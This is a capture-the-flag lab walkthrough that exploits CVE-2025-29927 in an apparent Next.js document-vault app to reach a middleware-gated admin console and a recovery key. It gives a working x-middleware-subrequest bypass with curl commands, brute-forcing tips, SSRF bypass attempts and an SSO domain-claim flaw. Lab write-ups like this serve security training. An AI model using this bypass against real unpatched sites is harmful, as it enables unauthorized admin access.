# vaulty-006 - BugForge Lab Walkthrough

**URL:** https://lab-1783810802650-d6oo2b.labs-app.bugforge.io/
**Difficulty:** Medium
**Vulnerability:** CVE-2025-29927 (Next.js middleware authorization-bypass) → staff-only `/admin` ops console → break-glass recovery key disclosure
**Flag:** `bug{829hEfs6jJZ71epZEg0Pz3xFr9h3DICF}`

---

## Summary

Vaultly is a multi-tenant document-vault SaaS (Next.js App Router). Tenant-facing access control
(vault/file ownership, IDOR, SSRF import allowlist, file-content XSS) is all implemented soundly.
The actual bug lives one layer up: a staff-only `/admin` "Vaultly HQ Ops Console" is gated purely
by Next.js **middleware** rather than server-side session/role checks ("gated at the edge"). That
makes it vulnerable to **CVE-2025-29927**, where sending a crafted `x-middleware-subrequest` header
causes Next.js to treat the request as an internal middleware-to-middleware subrequest and skip
middleware execution entirely - bypassing the auth gate with no credentials at all. The console
leaks a break-glass org-recovery key endpoint, which returns the flag directly.

## Tech Stack

- Next.js (App Router), React Server Components / RSC flight payloads
- Traditional `<form method="post">` submissions to `/api/*` route handlers (not client-side JSON fetch)
- Cookie-based session (`vaultly_session`, HttpOnly, SameSite=lax)
- Multi-tenant: orgs, vaults, folders, files, roles (viewer/editor/admin/owner), share links, personal API tokens, OAuth2 "connected apps", OIDC SSO-per-domain

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/auth/register` | none | form-urlencoded, creates org + owner |
| `POST /api/auth/login` | none | demo creds: `owner\|admin\|editor\|viewer@acme.test` / `vaultly` |
| `GET /vaults/:id`, `POST /api/files`, `/api/files/import`, `/api/shares` | session | ownership-checked correctly (IDOR-safe) |
| `POST /api/sso` | session (any role apparently) | claims an email domain for org SSO with **zero domain-ownership verification** - not the graded bug here, but a real secondary finding |
| `GET /admin` | **middleware-only** ("edge") | staff-only ops console; bypassable via CVE-2025-29927 |
| `GET /admin/api/recovery` | same middleware gate | returns break-glass recovery key JSON - **flag** |

## Attack Chain

1. Register an org, explore the app. All direct tenant-side attack surfaces (vault/file IDOR,
   SSRF via `/api/files/import`, stored XSS via uploaded/shared file content) are solidly defended:
   - File-import SSRF: host allowlist blocks `127.0.0.1`, `127.1`, hex/octal/decimal encodings, `0.0.0.0`; IPv6 loopback literals fail at DNS resolution (`EAI_AGAIN`), not just the string check - looks like a resolve-then-validate pattern.
   - Vault/file access: cross-org read/write both return 404/403 with two independently-registered test accounts.
   - File-content XSS: every serving path (`/api/files/:id?download=1`, `/api/files/:id/preview`, `/api/share/:token?inline=1`) coerces any non-allowlisted MIME type down to `text/plain`, and for `image/*` it adds `Content-Security-Policy: default-src 'none'` to kill inline SVG script execution.
2. Login page reveals **seeded demo credentials** for a realistic tenant "Acme Corp":
   `owner@acme.test` / `admin@acme.test` / `editor@acme.test` / `viewer@acme.test`, password `vaultly` for all.
3. Logged in as the lowest-privilege `viewer@acme.test`, browsed all 6 vaults (Engineering, Product,
   Legal, Finance, People, Marketing) - viewer already has broad read access, but the real payload
   is a planted internal doc:

   ```
   GET /api/files/5?download=1  (Engineering / Runbooks / internal-ops-console.md)

   # Internal: Vaultly HQ Ops Console
   Production incidents are handled from the Vaultly HQ operations console at `/admin`.
   It is staff-only - access is gated at the edge, so tenant logins are rejected outright.
   When a customer loses their owner, HQ issues a one-time break-glass recovery key from the
   console (pulled from the recovery service on demand - never paste it into a ticket).
   ```

   "gated at the edge" is the tell: auth enforcement lives in middleware, not in the route handler.
4. Confirmed `/admin` is blocked for both anonymous and authenticated (viewer) requests:
   `403 Forbidden - Vaultly HQ staff only.` (plain-text, not a Next.js-rendered page - consistent
   with a middleware short-circuit before the app router even runs).
5. Applied **CVE-2025-29927**: Next.js resolves the internal middleware-invocation depth from the
   `x-middleware-subrequest` header, and a header value matching `<middleware-file-path>` repeated
   for the configured recursion limit causes Next.js to believe this is already a middleware
   subrequest and **skip running middleware entirely**. Brute-forced the middleware file "name"
   component (this app's middleware is compiled from `src/middleware.ts`, not the more common bare
   `middleware.ts`) and the repeat count:

   ```bash
   curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
     https://<target>/admin
   # => HTTP 200, full "Vaultly HQ - Operations Console" page rendered
   ```

6. The console page states the recovery key is fetched live, not cached, and points at:

   ```
   GET /admin/api/recovery
   ```

   Same bypass header on that path returns:

   ```json
   {"org":"Vaultly HQ","note":"Break-glass recovery key — rotate immediately after use.","recovery_key":"bug{829hEfs6jJZ71epZEg0Pz3xFr9h3DICF}"}
   ```

   **Flag:** `bug{829hEfs6jJZ71epZEg0Pz3xFr9h3DICF}`

## Discovery Notes

- The phrase "gated at the edge" in a planted internal doc was the explicit signal pointing away
  from application-layer access control and toward infrastructure/framework-layer enforcement -
  worth treating as a strong hint any time a BugForge doc describes auth in those terms.
- The plain `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`
  canonical CVE-2025-29927 PoC value (assuming default `middleware.ts` at repo root) did **not**
  work here - this app's middleware source path is `src/middleware.ts`, so the header segment had
  to be `src/middleware` instead of bare `middleware`. Always brute-force both the repeat count
  (1-7) and the path segment name when this CVE doesn't fire on the first try.

## Dead Ends

| Attempted | Why it failed | Lesson |
|---|---|---|
| SSRF via `/api/files/import` - `127.0.0.1`, `127.1`, hex/decimal/octal, `0.0.0.0`, `nip.io`/`sslip.io`, `localtest.me` | All blocked pre-connect: `"Host not allowed"` | Hostname-string blocklist is comprehensive for common encodings |
| Same, IPv6 `[::1]`, `[::ffff:127.0.0.1]` | Passed the blocklist (no "Host not allowed") but failed with `getaddrinfo EAI_AGAIN` | Interesting differential, but never reached a live connection - likely no IPv6 route in the sandbox, not an exploitable gap |
| Cross-org vault/file IDOR (read + write) with two independently-registered accounts | Consistent 404/403 | Ownership checks are enforced at both vault and file object level |
| Stored XSS via uploaded `text/html`, `image/svg+xml` (script+onload), and SSRF-imported real external HTML | All three coerced to safe `text/plain` on preview/share-inline; download path forces `Content-Disposition: attachment`; SVG preview adds strict CSP | Mitigation is applied consistently across all three file-serving code paths |
| `/invite/:token` acceptance flow, register-time `org_id`/`orgId` mass assignment to join an existing org | `/invite/:token` page 404s regardless of auth state; extra register fields silently ignored | Invite-link display is UI-only in this build; not the intended vector |
| SSO domain claim (`POST /api/sso` with attacker-controlled issuer/client_id/secret for domain `victim-corp.com`) | Succeeded with **zero domain-ownership verification** (real secondary finding) but no discoverable SSO-login trigger on `/login` or any `/api/sso/*` lookup/authorize endpoint | Confirmed primitive, but this build doesn't appear to wire it into the login flow - not the graded bug, worth flagging separately |
| `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (canonical PoC, repeat counts 1-7) | 403 every time | Wrong middleware source path assumption - this app uses `src/middleware.ts` |

## Root Causes

- Critical internal tooling (`/admin`, break-glass org recovery) was gated **exclusively** in Next.js
  middleware with no defense-in-depth server-side check in the route handler itself - a single
  framework-layer bypass (CVE-2025-29927) fully defeats it.
- Running an outdated/vulnerable Next.js version in a security-sensitive deployment without the
  vendor patch for a critical, publicly-disclosed authorization-bypass CVE.
- Secondary: SSO domain claiming has no ownership verification (any org can bind any email domain
  to attacker-controlled OIDC issuer/client_id/secret) - a real-world "SSO domain hijack" pattern,
  even though this lab build doesn't complete the login-trigger wiring to exploit it end-to-end.

## CWE / OWASP

- CWE-863: Incorrect Authorization (middleware-only enforcement bypassed by CVE-2025-29927)
- OWASP A01:2021 - Broken Access Control
- OWASP A06:2021 - Vulnerable and Outdated Components (unpatched Next.js)
- Secondary: CWE-290 (Authentication Bypass by Spoofing) - SSO domain claim without ownership check
